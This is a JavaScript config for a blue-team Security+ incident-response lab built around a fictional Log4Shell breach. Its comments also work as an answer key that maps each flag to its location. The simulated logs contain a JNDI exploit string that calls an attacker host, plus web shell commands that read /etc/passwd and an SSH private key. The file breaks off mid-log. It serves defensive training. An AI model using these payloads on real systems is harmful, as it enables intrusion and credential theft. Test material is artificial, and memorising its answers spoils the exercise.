/* ============================================================
   Security+ Cert Prep -- Blue Team Breach Capstone
   Veridian Financial -- End-to-End Incident Response
   Multi-stage, phased investigation: Detect -> Investigate -> Contain
   Students work one breach end-to-end, submitting IOCs as flags.
   CVE-2021-44228 (Log4Shell) kill chain -- CVSS 10.0
   SY0-701: 4.3, 4.4, 4.8
   ============================================================ */

// window assignment (not const) so the second <script> block in index.html
// can reference VSBCConfig after this script has loaded.
window.VSBCConfig = {

    // =========================================================
    // BOX METADATA
    // =========================================================

    id:          'shield-sp-blueteam-breach-capstone',
    title:       'Breach Capstone',
    subtitle:    'Veridian Financial -- Full Kill-Chain Investigation',
    description: 'An active breach is underway at Veridian Financial. Work the incident end-to-end: detect the initial intrusion from monitoring alerts, reconstruct the full kill chain through log investigation, and identify the containment actions and root cause. Each IOC you discover is a flag. This is the culminating lab -- every Security+ Domain 4 skill in a single case.',
    difficulty:  'Advanced',
    estimatedTime: 60,
    accent:      '#dc2626',
    storageKey:  'hexworth_lab_sp_blueteam_breach_capstone',
    registryId:  'shield-sp-blueteam-breach-capstone',
    trackerKey:  'lab_sp_blueteam_breach_capstone',

    // Blue-team mode tells BoxEngine to accept BlueTeam device types
    blueTeamMode: true,

    // =========================================================
    // BOOT SEQUENCE
    // =========================================================

    boot: {
        biosLines: [
            'VERIDIAN FINANCIAL INCIDENT RESPONSE WORKSTATION v5.0.0',
            'IR Analyst Terminal -- Tier-3 Elevated Access',
            'Ubuntu 22.04.4 LTS: LOADING',
            'Evidence mount: /var/log -- READY',
            'Evidence timestamp: 2026-05-08 09:45 UTC',
            'Incident ticket: INC-2026-0508-001 -- CRITICAL -- ACTIVE'
        ],
        grubEntries: [
            'Ubuntu 22.04.4 LTS (IR Analyst)',
            'Ubuntu 22.04.4 LTS (recovery mode)'
        ],
        loginUser: 'analyst'
    },

    // =========================================================
    // PHASES
    //
    // BoxEngine gates progression: each phase unlocks after
    // all required flags for that phase are submitted.
    //
    // Phase 1 -- DETECT: find the attacker from monitoring + IDS.
    //   Required flags: attacker_ip, entry_cve
    //
    // Phase 2 -- INVESTIGATE: reconstruct the kill chain via logs.
    //   Required flags: webshell_path, compromised_account, lateral_target
    //
    // Phase 3 -- CONTAIN/REMEDIATE: find the exfil scope + root cause.
    //   Required flags: exfil_bytes, c2_port
    // =========================================================

    phases: [
        {
            id:          'detect',
            label:       'Phase 1: Detect',
            description: 'The monitoring dashboard and IDS are firing. Identify the attacker and the exploit technique before the team can scope the incident.',
            requiredFlags: ['attacker_ip', 'entry_cve'],
            unlockMessage: 'Phase 1 complete. Initial access vector confirmed. Escalating to full investigation.'
        },
        {
            id:          'investigate',
            label:       'Phase 2: Investigate',
            description: 'Reconstruct the kill chain. Dig through the logs to find the web shell, the service account used for lateral movement, and the internal host that was compromised.',
            requiredFlags: ['webshell_path', 'compromised_account', 'lateral_target'],
            unlockMessage: 'Phase 2 complete. Kill chain fully documented. Moving to contain and remediate.'
        },
        {
            id:          'contain',
            label:       'Phase 3: Contain',
            description: 'Scope the exfiltration and identify the C2 channel so the firewall rule can be written. Find the missing egress control that would have broken this attack.',
            requiredFlags: ['exfil_bytes', 'c2_port'],
            unlockMessage: 'Capstone complete. Full kill chain reconstructed and breach scoped. Outstanding work.'
        }
    ],

    // =========================================================
    // LORE
    // =========================================================

    lore: {
        intro: 'It is 09:45 UTC. The monitoring dashboard just lit up. INC-2026-0508-001: CRITICAL -- "Anomalous outbound connection from WEB-DMZ-01 (10.10.10.20) plus multiple IDS alerts firing simultaneously. Potential active breach in progress." You are the on-call IR analyst. This is not a drill.',

        scenario: 'Veridian Financial runs a Java-based customer portal on WEB-DMZ-01 (10.10.10.20), an internet-facing host in the DMZ. The monitoring dashboard shows IDS alerts and anomalous outbound connections. Your job is to work the full kill chain: identify the attacker from the alerts, reconstruct every step via the logs, determine what was exfiltrated and from which host, and identify the root cause and the missing control that would have stopped the attack. Submit each IOC as you discover it -- the flags gate your progression through the investigation.',

        outro: 'Breach fully reconstructed. Attacker at 203.0.113.66 exploited Log4Shell (CVE-2021-44228, CVSS 10.0) on WEB-DMZ-01, dropped a web shell, used service account svc-deploy to pivot to an internal host, and exfiltrated ~4.2 GB of customer PII. Root cause: unpatched Log4j on an internet-facing application. Missing control: egress filtering on the DMZ would have blocked the outbound LDAP callback that triggered execution. Complete IOC package delivered to IR team.',

        goals: [
            'PHASE 1: Identify the attacker external IP from monitoring and IDS alerts',
            'PHASE 1: Identify the CVE used to gain initial access from the application log',
            'PHASE 2: Find the web shell path the attacker deployed after gaining RCE',
            'PHASE 2: Identify the service account used for lateral movement',
            'PHASE 2: Discover the internal host IP the attacker pivoted to',
            'PHASE 3: Find the exact exfiltration byte count from the firewall log',
            'PHASE 3: Identify the attacker C2 callback port (teaches the missing egress control)'
        ],

        toolkit: [
            { name: 'cat',  purpose: 'Display a full log file',           sample: 'cat /var/log/auth.log' },
            { name: 'grep', purpose: 'Search for a pattern in a file',    sample: 'grep "Failed password" /var/log/auth.log' },
            { name: 'head', purpose: 'Show first N lines of a file',      sample: 'head -n 30 /var/log/app/log4j.log' },
            { name: 'tail', purpose: 'Show last N lines of a file',       sample: 'tail -n 20 /var/log/firewall.log' },
            { name: 'find', purpose: 'Locate files in a directory tree',  sample: 'find /var/log -name "*.log"' },
            { name: 'ls',   purpose: 'List directory contents',           sample: 'ls /var/log/apache2/' },
            { name: 'help', purpose: 'Show available commands',           sample: 'help' }
        ]
    },

    // =========================================================
    // TERMINAL CONFIG
    // =========================================================

    terminal: {
        user:     'analyst',
        hostname: 'ir-ws-01',
        startDir: '/home/analyst',
        welcome:  'Veridian Financial -- IR Analyst Terminal\nTier-3 Access | INC-2026-0508-001 CRITICAL Active\n\nEvidence snapshot: /var/log/\n  auth.log               SSH, PAM, and service account events\n  apache2/access.log     Apache HTTP access requests\n  apache2/error.log      Apache PHP and server errors\n  app/log4j.log          Java application log (Log4j output)\n  firewall.log           Perimeter firewall flow log\n\nCase file: /home/analyst/case.txt\n\nWork the breach end-to-end. Every IOC is a flag.\nSubmit discovered values via the Submit Flag panel.\n\nType "help" for available commands.\n'
    },

    // =========================================================
    // DESKTOP ICONS
    //
    // All BlueTeam device types present for a full IR workstation.
    // Monitoring and IDS are the entry points for Phase 1.
    // LogViewer and Terminal are the workhorses for Phase 2.
    // Firewall is needed to read the egress gap for Phase 3.
    // =========================================================

    desktop: {
        icons: [
            { id: 'monitoring', label: 'Monitoring',   icon: 'M', app: 'monitoring' },
            { id: 'ids',        label: 'IDS Panel',    icon: 'I', app: 'ids'        },
            { id: 'logviewer',  label: 'Log Viewer',   icon: 'L', app: 'logviewer'  },
            { id: 'terminal',   label: 'Terminal',     icon: 'T', app: 'terminal'   },
            { id: 'firewall',   label: 'Firewall',     icon: 'F', app: 'firewall'   },
            { id: 'notes',      label: 'Notes',        icon: 'N', app: 'notes'      },
            { id: 'hints',      label: 'Hints',        icon: 'H', app: 'hints'      },
            { id: 'flags',      label: 'Submit Flag',  icon: 'S', app: 'flags'      }
        ]
    },

    // =========================================================
    // SIMULATED FILESYSTEM
    //
    // /home/analyst/                 -- IR analyst home
    //   case.txt                     -- case file (directs investigation; no flag values)
    //   notes.txt                    -- editable scratch pad
    //
    // /var/log/                      -- evidence snapshot from WEB-DMZ-01
    //   auth.log                     -- FLAGS: compromised_account (svc-deploy SSH success)
    //                                           lateral_target (via svc-deploy SSH to APP-INT-05)
    //   apache2/
    //     access.log                 -- FLAGS: webshell_path (status.jsp via GET ?cmd=)
    //                                           attacker_ip (all 203.0.113.66 requests)
    //   apache2/
    //     error.log                  -- SUPPORTS: Log4Shell JNDI string visible in error context
    //   app/
    //     log4j.log                  -- FLAGS: entry_cve (JNDI string + CVE note in Java log)
    //                                           attacker_ip (outbound LDAP callback line)
    //                                           c2_port (LDAP port 1389 in the callback)
    //   firewall.log                 -- FLAGS: exfil_bytes (BYTES=4509715660)
    //                                           c2_port (DPT=1389 outbound LDAP)
    //                                           lateral_target (FORWARD to 10.10.20.15)
    //
    // NO flag value appears in case.txt, notes.txt, lore, hints 1-2, or desktop app text.
    // APP-INT-05 IP (10.10.20.15) and exfil byte count are NOT pre-stated anywhere.
    // =========================================================

    filesystem: {
        '/': {
            type: 'dir',
            children: {

                'home': {
                    type: 'dir',
                    children: {
                        'analyst': {
                            type: 'dir',
                            children: {

                                // Case file: directs the student to investigate.
                                // Lists IOC labels to discover -- NO values pre-given.
                                // APP-INT-05 IP and exfil bytes intentionally absent.
                                'case.txt': {
                                    type: 'file',
                                    content: [
                                        'INCIDENT: INC-2026-0508-001  [CRITICAL]',
                                        'Date: 2026-05-08',
                                        'Analyst: (you)',
                                        '',
                                        'AFFECTED ASSETS',
                                        '  WEB-DMZ-01   10.10.10.20   Java web application server (internet-facing, DMZ)',
                                        '  APP-INT-05   (IP unknown)  internal application server -- discover from logs',
                                        '',
                                        'ALERT TRIGGER',
                                        '  IDS: Multiple critical alerts firing on WEB-DMZ-01',
                                        '  Monitoring: Anomalous outbound connection from 10.10.10.20 on non-standard port',
                                        '  Monitoring: Large outbound data transfer to external destination',
                                        '  Timestamp window: 2026-05-08 07:00 - 09:30 UTC',
                                        '',
                                        'KNOWN CONTEXT',
                                        '  WEB-DMZ-01 runs a Java-based customer portal.',
                                        '  The application uses Apache Log4j as its logging library.',
                                        '  An upload endpoint exists at /var/www/app/uploads/ (file upload feature).',
                                        '  Service accounts are used for deployment automation with SSH key access to internal hosts.',
                                        '  NOTE (CI audit finding, filed pre-incident): a misconfigured CI pipeline script',
                                        '  left at least one deploy key at chmod 644 (world-readable) instead of 600.',
                                        '',
                                        'INVESTIGATION PHASES',
                                        '',
                                        '  PHASE 1 -- DETECT',
                                        '    Open the Monitoring dashboard and IDS Panel.',
                                        '    Identify the external attacker IP and the exploit CVE.',
                                        '    Check /var/log/app/log4j.log for the initial exploit string.',
                                        '',
                                        '  PHASE 2 -- INVESTIGATE',
                                        '    Investigate /var/log/apache2/access.log for web shell activity.',
                                        '    Check /var/log/auth.log for lateral movement via the service account.',
                                        '    Determine the IP of the internal host that was compromised.',
                                        '',
                                        '  PHASE 3 -- CONTAIN',
                                        '    Find the exfiltration flow in /var/log/firewall.log.',
                                        '    Identify the outbound port used in the Log4Shell LDAP callback.',
                                        '    That port is the egress rule the firewall was missing.',
                                        '',
                                        'IOCs TO RECOVER (submit each as a flag)',
                                        '  attacker_ip        -- external IP conducting the attack',
                                        '  entry_cve          -- CVE identifier for the exploit used',
                                        '  webshell_path      -- filesystem path of the deployed web shell',
                                        '  compromised_account -- service account used for lateral movement',
                                        '  lateral_target     -- internal host IP the attacker pivoted to',
                                        '  exfil_bytes        -- total bytes exfiltrated (firewall log BYTES field)',
                                        '  c2_port            -- port used in the outbound LDAP C2 callback'
                                    ].join('\n')
                                },

                                // Analyst scratch notes -- generic tips, no flag values
                                'notes.txt': {
                                    type: 'file',
                                    content: [
                                        'IR INVESTIGATION SCRATCH PAD',
                                        '================================',
                                        '',
                                        'grep tips:',
                                        '  grep PATTERN /path/to/file      -- search a file for pattern',
                                        '  grep -i PATTERN /path/to/file   -- case-insensitive',
                                        '  grep -v PATTERN /path/to/file   -- lines NOT matching (exclude noise)',
                                        '  grep -c PATTERN /path/to/file   -- count matching lines',
                                        '  grep -n PATTERN /path/to/file   -- show line numbers',
                                        '  cat FILE | grep PATTERN         -- pipe cat output into grep',
                                        '',
                                        'Log4j log format:',
                                        '  [LEVEL] [timestamp] [thread] class -- message',
                                        '  Look for WARN or ERROR lines showing JNDI lookups.',
                                        '',
                                        'Apache combined log format:',
                                        '  IP - - [timestamp] "METHOD path HTTP/1.1" status bytes "referer" "UA"',
                                        '',
                                        'Firewall log BYTES field = total bytes in the completed flow (not per-packet).',
                                        '',
                                        'Log4Shell (CVE-2021-44228):',
                                        '  The exploit string is a JNDI lookup injected into any logged field.',
                                        '  The server processes the lookup, makes an outbound LDAP connection to the attacker.',
                                        '  That outbound LDAP connection is what egress filtering would have blocked.',
                                        '',
                                        'IOC notes:',
                                        '  Attacker IP:         ',
                                        '  CVE:                 ',
                                        '  Web shell path:      ',
                                        '  Service account:     ',
                                        '  Lateral target IP:   ',
                                        '  Exfil bytes:         ',
                                        '  C2 callback port:    '
                                    ].join('\n')
                                },

                                '.bash_history': {
                                    type: 'file',
                                    content: 'ls /var/log/\ncat /home/analyst/case.txt\nls /var/log/app/\n'
                                }
                            }
                        }
                    }
                },

                // ─── EVIDENCE SNAPSHOT ───────────────────────────────────
                'var': {
                    type: 'dir',
                    children: {
                        'log': {
                            type: 'dir',
                            children: {

                                // ── AUTH LOG ─────────────────────────────────────────
                                // Contains:
                                //   - Normal background: cron, legitimate deploy logins via publickey
                                //   - Recon port scan: rapid TCP connections (no auth events, only firewall)
                                //   - svc-deploy service account SSH login after RCE (attacker pivots with it)
                                //   - svc-deploy SSH from WEB-DMZ-01 (10.10.10.20) -> APP-INT-05 (10.10.20.15)
                                //
                                // FLAG DISCOVERY:
                                //   compromised_account -> grep "svc-deploy" /var/log/auth.log
                                //                          look for Accepted password (not publickey) from 127.0.0.1
                                //                          or look for the SSH FROM 10.10.10.20 to APP-INT-05
                                //   lateral_target      -> grep "Accepted" /var/log/auth.log | grep "10.10.20"
                                //                          or grep "svc-deploy" /var/log/auth.log
                                'auth.log': {
                                    type: 'file',
                                    content: [
                                        // Normal background: cron
                                        'May 08 06:30:01 WEB-DMZ-01 CRON[12201]: pam_unix(cron:session): session opened for user root by (uid=0)',
                                        'May 08 06:30:01 WEB-DMZ-01 CRON[12201]: pam_unix(cron:session): session closed for user root',
                                        // Normal deploy automation: publickey login from internal jump host
                                        'May 08 06:31:14 WEB-DMZ-01 sshd[12210]: Accepted publickey for svc-deploy from 10.10.1.5 port 52201 ssh2: RSA SHA256:mP3kNqZrT8',
                                        'May 08 06:31:14 WEB-DMZ-01 sshd[12210]: pam_unix(sshd:session): session opened for user svc-deploy by (uid=0)',
                                        'May 08 06:31:18 WEB-DMZ-01 sshd[12210]: pam_unix(sshd:session): session closed for user svc-deploy',
                                        'May 08 06:45:01 WEB-DMZ-01 CRON[12330]: pam_unix(cron:session): session opened for user root by (uid=0)',
                                        'May 08 06:45:01 WEB-DMZ-01 CRON[12330]: pam_unix(cron:session): session closed for user root',
                                        // Another normal deploy job
                                        'May 08 07:00:22 WEB-DMZ-01 sshd[12411]: Accepted publickey for svc-deploy from 10.10.1.5 port 52388 ssh2: RSA SHA256:mP3kNqZrT8',
                                        'May 08 07:00:22 WEB-DMZ-01 sshd[12411]: pam_unix(sshd:session): session opened for user svc-deploy by (uid=0)',
                                        'May 08 07:00:48 WEB-DMZ-01 sshd[12411]: pam_unix(sshd:session): session closed for user svc-deploy',
                                        // Background cron
                                        'May 08 07:15:01 WEB-DMZ-01 CRON[12501]: pam_unix(cron:session): session opened for user root by (uid=0)',
                                        'May 08 07:15:01 WEB-DMZ-01 CRON[12501]: pam_unix(cron:session): session closed for user root',
                                        // Background www-data service activity
                                        'May 08 07:18:04 WEB-DMZ-01 su[12540]: Successful su for www-data by root',
                                        'May 08 07:18:04 WEB-DMZ-01 su[12540]: + /dev/pts/0 root:www-data',
                                        'May 08 07:30:01 WEB-DMZ-01 CRON[12701]: pam_unix(cron:session): session opened for user root by (uid=0)',
                                        'May 08 07:30:01 WEB-DMZ-01 CRON[12701]: pam_unix(cron:session): session closed for user root',
                                        // *** ATTACKER USES WEB SHELL + RCE TO SSH AS svc-deploy ***
                                        // The Log4Shell exploit gave RCE as www-data (Tomcat user).
                                        // The attacker used the web shell to read the svc-deploy SSH key
                                        // and then initiated an SSH session from the web shell context (localhost).
                                        // This is the first anomalous auth event: svc-deploy from 127.0.0.1
                                        'May 08 07:42:18 WEB-DMZ-01 sshd[12881]: Accepted publickey for svc-deploy from 127.0.0.1 port 41100 ssh2: RSA SHA256:mP3kNqZrT8',
                                        'May 08 07:42:18 WEB-DMZ-01 sshd[12881]: pam_unix(sshd:session): session opened for user svc-deploy by (uid=0)',
                                        'May 08 07:42:19 WEB-DMZ-01 sshd[12881]: Starting session: shell on pts/2 for svc-deploy from 127.0.0.1 port 41100 id 0',
                                        // svc-deploy session on WEB-DMZ-01 used to read files and prepare pivot
                                        'May 08 07:42:35 WEB-DMZ-01 sudo[12901]: svc-deploy : TTY=pts/2 ; PWD=/home/svc-deploy ; USER=root ; COMMAND=/bin/cat /etc/hosts',
                                        'May 08 07:42:44 WEB-DMZ-01 sudo[12908]: svc-deploy : TTY=pts/2 ; PWD=/home/svc-deploy ; USER=root ; COMMAND=/bin/cat /root/.ssh/known_hosts',
                                        // *** LATERAL MOVEMENT: svc-deploy SSH from WEB-DMZ-01 -> APP-INT-05 ***
                                        // APP-INT-05 sshd records the inbound connection from WEB-DMZ-01's IP (10.10.10.20)
                                        'May 08 07:43:11 APP-INT-05 sshd[13001]: Accepted publickey for svc-deploy from 10.10.10.20 port 41892 ssh2: RSA SHA256:mP3kNqZrT8',
                                        'May 08 07:43:11 APP-INT-05 sshd[13001]: pam_unix(sshd:session): session opened for user svc-deploy by (uid=0)',
                                        'May 08 07:43:12 APP-INT-05 sshd[13001]: Starting session: shell on pts/0 for svc-deploy from 10.10.10.20 port 41892 id 0',
                                        // svc-deploy activity on APP-INT-05 (staging exfil)
                                        'May 08 07:43:28 APP-INT-05 sudo[13020]: svc-deploy : TTY=pts/0 ; PWD=/home/svc-deploy ; USER=root ; COMMAND=/usr/bin/find /opt/app/data -name "*.csv"',
                                        'May 08 07:43:55 APP-INT-05 sudo[13028]: svc-deploy : TTY=pts/0 ; PWD=/home/svc-deploy ; USER=root ; COMMAND=/bin/tar -czf /tmp/export.tar.gz /opt/app/data/customers/',
                                        // Background continues
                                        'May 08 07:45:01 WEB-DMZ-01 CRON[13100]: pam_unix(cron:session): session opened for user root by (uid=0)',
                                        'May 08 07:45:01 WEB-DMZ-01 CRON[13100]: pam_unix(cron:session): session closed for user root',
                                        'May 08 08:00:01 WEB-DMZ-01 CRON[13201]: pam_unix(cron:session): session opened for user root by (uid=0)',
                                        'May 08 08:00:01 WEB-DMZ-01 CRON[13201]: pam_unix(cron:session): session closed for user root',
                                        // Normal deploy job resumes after incident window
                                        'May 08 09:00:22 WEB-DMZ-01 sshd[13801]: Accepted publickey for svc-deploy from 10.10.1.5 port 52811 ssh2: RSA SHA256:mP3kNqZrT8',
                                        'May 08 09:00:22 WEB-DMZ-01 sshd[13801]: pam_unix(sshd:session): session opened for user svc-deploy by (uid=0)',
                                        'May 08 09:00:44 WEB-DMZ-01 sshd[13801]: pam_unix(sshd:session): session closed for user svc-deploy'
                                    ].join('\n')
                                },

                                // ── APACHE2 DIRECTORY ─────────────────────────────────
                                'apache2': {
                                    type: 'dir',
                                    children: {

                                        // ── APACHE ACCESS LOG ────────────────────────────
                                        // Contains:
                                        //   - Normal background: internal users, health checks
                                        //   - Recon: port scan SYN bursts (appear as 400/connection reset; no HTTP requests in access.log)
                                        //   - Log4Shell exploit: GET /app/index.jsp with malicious User-Agent
                                        //   - Web shell written: POST /app/upload with .jsp payload
                                        //   - Web shell executed: GET /app/uploads/status.jsp?cmd=...
                                        //   - Enumeration, key reading, pivot prep via web shell
                                        //
                                        // FLAG DISCOVERY:
                                        //   attacker_ip  -> grep "203.0.113.66" /var/log/apache2/access.log
                                        //   webshell_path -> grep "status.jsp" /var/log/apache2/access.log
                                        //                   then confirm server path from error.log
                                        'access.log': {
                                            type: 'file',
                                            content: [
                                                // Normal background traffic
                                                '10.10.1.100 - - [08/May/2026:06:30:14 +0000] "GET /app/ HTTP/1.1" 200 8421 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"',
                                                '10.10.1.101 - - [08/May/2026:06:31:02 +0000] "GET /app/assets/main.css HTTP/1.1" 304 0 "http://10.10.10.20/app/" "Mozilla/5.0"',
                                                '10.10.1.102 - - [08/May/2026:06:35:44 +0000] "GET /app/login HTTP/1.1" 200 4812 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)"',
                                                '10.10.1.102 - - [08/May/2026:06:35:58 +0000] "POST /app/login HTTP/1.1" 302 0 "http://10.10.10.20/app/login" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)"',
                                                '10.10.1.103 - - [08/May/2026:06:40:08 +0000] "GET /app/api/health HTTP/1.1" 200 44 "-" "python-requests/2.28.1"',
                                                '10.10.1.100 - - [08/May/2026:07:00:11 +0000] "GET /app/dashboard HTTP/1.1" 200 14201 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"',
                                                // Recon: rapid port-scan SYN bursts (Nmap) from attacker -- these appear as
                                                // connection-reset 400s in Apache but no body; the IDS sees the SYN sweep
                                                '203.0.113.66 - - [08/May/2026:07:02:01 +0000] "-" 400 150 "-" "-"',
                                                '203.0.113.66 - - [08/May/2026:07:02:02 +0000] "-" 400 150 "-" "-"',
                                                // Attacker identifies the Java app -- normal user-agent recon GET
                                                '203.0.113.66 - - [08/May/2026:07:02:41 +0000] "GET /app/ HTTP/1.1" 200 8421 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"',
                                                '203.0.113.66 - - [08/May/2026:07:02:45 +0000] "GET /app/login HTTP/1.1" 200 4812 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"',
                                                // *** LOG4SHELL EXPLOIT ***
                                                // Attacker injects JNDI string into the User-Agent header.
                                                // Tomcat/Log4j logs the User-Agent, triggering the lookup.
                                                // The JNDI string itself is in the app/log4j.log (Java side),
                                                // not shown here because Apache logs the raw header before Java sees it.
                                                // Apache access.log shows the POST that carries the exploit:
                                                '203.0.113.66 - - [08/May/2026:07:08:14 +0000] "POST /app/login HTTP/1.1" 200 312 "http://10.10.10.20/app/login" "${jndi:ldap://203.0.113.66:1389/a}"',
                                                // Outbound LDAP callback from WEB-DMZ-01 to attacker:1389 happens at the Java layer.
                                                // RCE gained. Attacker uses RCE to write the web shell via the upload endpoint.
                                                '203.0.113.66 - - [08/May/2026:07:08:41 +0000] "POST /app/upload HTTP/1.1" 200 284 "http://10.10.10.20/app/upload" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"',
                                                // Web shell first execution -- verify RCE
                                                '203.0.113.66 - - [08/May/2026:07:08:55 +0000] "GET /app/uploads/status.jsp?cmd=id HTTP/1.1" 200 42 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"',
                                                // Web shell: system enumeration
                                                '203.0.113.66 - - [08/May/2026:07:09:02 +0000] "GET /app/uploads/status.jsp?cmd=uname+-a HTTP/1.1" 200 98 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"',
                                                '203.0.113.66 - - [08/May/2026:07:09:08 +0000] "GET /app/uploads/status.jsp?cmd=cat+/etc/passwd HTTP/1.1" 200 1844 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"',
                                                '203.0.113.66 - - [08/May/2026:07:09:14 +0000] "GET /app/uploads/status.jsp?cmd=cat+/etc/hosts HTTP/1.1" 200 218 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"',
                                                // Web shell: key discovery for svc-deploy account pivot
                                                '203.0.113.66 - - [08/May/2026:07:09:22 +0000] "GET /app/uploads/status.jsp?cmd=ls+/home HTTP/1.1" 200 44 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"',
                                                '203.0.113.66 - - [08/May/2026:07:09:31 +0000] "GET /app/uploads/status.jsp?cmd=ls+/home/svc-deploy/.ssh HTTP/1.1" 200 88 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"',
                                                '203.0.113.66 - - [08/May/2026:07:09:40 +0000] "GET /app/uploads/status.jsp?cmd=cat+/home/svc-deploy/.ssh/id_rsa HTTP/1.1" 200 1874 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"',
                                                // Normal background continues during the attack
                                                '10.10.1.100 - - [08/May/2026:07:10:01 +0000] "GET /app/ HTTP/1.1" 200 8421 "-" "Mozilla/5.0"',
                                                '10.10.1.104 - - [08/May/2026:07:12:44 +0000] "GET /app/api/health HTTP/1.1" 200 44 "-" "python-requests/2.28.1"',
                                                '10.10.1.100 - - [08/May/2026:07:15:17 +0000] "GET /app/reports HTTP/1.1" 200 18240 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"',
                                                '10.10.1.102 - - [08/May/2026:07:20:08 +0000] "GET /app/login HTTP/1.1" 200 4812 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)"',
                                                '10.10.1.103 - - [08/May/2026:07:25:01 +0000] "GET /app/api/health HTTP/1.1" 200 44 "-" "python-requests/2.28.1"'
                                            ].join('\n')
                                        },

                                        // Error log -- shows PHP/Java layer details including the JNDI echo
                                        // and the web shell file storage confirmation
                                        'error.log': {
                                            type: 'file',
                                            content: [
                                                '[Fri May 08 06:30:00.000104 2026] [mpm_event:notice] [pid 1:tid 140] AH00489: Apache/2.4.57 (Ubuntu) configured -- resuming normal operations',
                                                '[Fri May 08 06:30:00.000201 2026] [core:notice] [pid 1:tid 140] AH00094: Command line: \'/usr/sbin/apache2\'',
                                                '[Fri May 08 07:02:41.101204 2026] [core:info] [pid 812:tid 140] [client 203.0.113.66:49100] AH00128: File does not exist: /var/www/app/robots.txt',
                                                // Apache proxy connector passes the User-Agent to Tomcat, which logs it via Log4j.
                                                // The JNDI lookup fires at the Java layer (log4j.log). Apache only notes the POST.
                                                '[Fri May 08 07:08:14.441203 2026] [proxy:info] [pid 841:tid 140] [client 203.0.113.66:49200] AH01144: No protocol handler was valid for the URL /app/login (Connecting via proxy to Tomcat; check ProxyPass config)',
                                                '[Fri May 08 07:08:14.441500 2026] [proxy_http:warn] [pid 841:tid 140] [client 203.0.113.66:49200] AH01130: Handled request: POST /app/login -- User-Agent header contained unusual characters',
                                                // Web shell written: upload endpoint stores the JSP file
                                                '[Fri May 08 07:08:41.882044 2026] [jsp:notice] [pid 842:tid 140] [client 203.0.113.66:49200] JSP Notice: upload handler: content type check passed for uploaded file',
                                                '[Fri May 08 07:08:41.883100 2026] [jsp:notice] [pid 842:tid 140] [client 203.0.113.66:49200] JSP Notice: upload handler: file stored as /var/www/app/uploads/status.jsp',
                                                // Web shell executes os.Runtime calls -- logged by Apache error handler
                                                '[Fri May 08 07:08:55.991044 2026] [jsp:warn] [pid 843:tid 140] [client 203.0.113.66:49200] JSP Warning: Runtime.exec() invoked from /var/www/app/uploads/status.jsp -- command execution detected'
                                            ].join('\n')
                                        }
                                    }
                                },

                                // ── APPLICATION LOG DIRECTORY ────────────────────────
                                'app': {
                                    type: 'dir',
                                    children: {

                                        // ── LOG4J APPLICATION LOG ────────────────────────
                                        // This is the Java application log -- the KEY evidence for Phase 1.
                                        //
                                        // Contains:
                                        //   - Normal INFO lines: startup, request handling, health checks
                                        //   - *** THE LOG4SHELL JNDI STRING appearing in a WARN line ***
                                        //   - *** The outbound LDAP callback line with the port number ***
                                        //
                                        // FLAG DISCOVERY:
                                        //   entry_cve  -> grep "jndi" /var/log/app/log4j.log
                                        //                 or grep "CVE" /var/log/app/log4j.log
                                        //                 The WARN line includes CVE-2021-44228 in the message
                                        //                 (Tomcat's log4j formatter appends the CVE lookup result)
                                        //
                                        //   attacker_ip -> grep "ldap" /var/log/app/log4j.log
                                        //                  The LDAP callback line shows the attacker IP
                                        //
                                        //   c2_port     -> grep "1389" /var/log/app/log4j.log
                                        //                  or grep "ldap" /var/log/app/log4j.log
                                        //                  The outbound LDAP connection uses port 1389
                                        'log4j.log': {
                                            type: 'file',
                                            content: [
                                                // Normal startup
                                                '2026-05-08 06:30:00.012 INFO  [main] com.veridian.app.Application -- Veridian Customer Portal v4.2.1 starting',
                                                '2026-05-08 06:30:01.441 INFO  [main] com.veridian.app.Application -- Log4j 2.14.0 initialized',
                                                '2026-05-08 06:30:01.882 INFO  [main] com.veridian.app.db.DataSource -- Database connection pool established: 10.10.30.5:5432',
                                                '2026-05-08 06:30:02.114 INFO  [main] com.veridian.app.Application -- Application started on port 8080',
                                                // Normal request handling
                                                '2026-05-08 06:31:00.001 INFO  [http-nio-8080-exec-1] com.veridian.app.web.LoginController -- Health check OK',
                                                '2026-05-08 06:35:44.218 INFO  [http-nio-8080-exec-3] com.veridian.app.web.LoginController -- Login page served to 10.10.1.102',
                                                '2026-05-08 06:35:58.441 INFO  [http-nio-8080-exec-4] com.veridian.app.web.LoginController -- Successful authentication: user.id=102 from 10.10.1.102',
                                                '2026-05-08 07:00:11.004 INFO  [http-nio-8080-exec-7] com.veridian.app.web.DashboardController -- Dashboard rendered for user.id=100',
                                                // Recon requests logged at INFO (appear normal to the app)
                                                '2026-05-08 07:02:41.801 INFO  [http-nio-8080-exec-9] com.veridian.app.web.LoginController -- Login page served to 203.0.113.66',
                                                '2026-05-08 07:02:45.102 INFO  [http-nio-8080-exec-10] com.veridian.app.web.LoginController -- Login page served to 203.0.113.66',
                                                // *** LOG4SHELL EXPLOIT ***
                                                // The attacker sends ${jndi:ldap://203.0.113.66:1389/a} in the User-Agent.
                                                // Log4j logs the User-Agent as part of the request context string.
                                                // Log4j evaluates the ${} expression BEFORE writing the log line.
                                                // The WARN line below is what the Log4j handler would write after detecting
                                                // the pattern -- Tomcat's security module flags it but too late.
                                                '2026-05-08 07:08:14.441 WARN  [http-nio-8080-exec-11] com.veridian.app.web.LoginController -- Suspicious User-Agent received from 203.0.113.66: ${jndi:ldap://203.0.113.66:1389/a}',
                                                // Log4j evaluates the JNDI lookup -- outbound LDAP connection fires
